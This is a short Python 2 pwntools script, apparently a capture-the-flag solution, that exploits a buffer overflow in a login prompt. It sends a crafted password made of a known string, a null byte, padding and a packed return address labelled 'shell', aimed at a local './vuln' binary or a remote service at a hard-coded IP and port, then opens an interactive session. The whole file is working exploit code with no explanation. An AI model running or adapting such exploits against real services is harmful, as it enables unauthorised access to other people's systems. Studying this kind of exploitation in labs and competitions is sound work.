#!/usr/bin/env python2

from pwn import *

###

DEBUG = True
size = 73
pwd = "todo: ldap and kerberos support"
shell = 0x400E9A

###

if DEBUG:
    r = process("./vuln")
else:
    r = remote("104.198.76.97", 9001)

r.recvuntil("username: ")
r.sendline("laxa")
r.recvuntil("password: ")
p = pwd + "\x00" + "Z" * (size - len(pwd) - 2) + p32(shell)
r.sendline(p)
r.interactive()
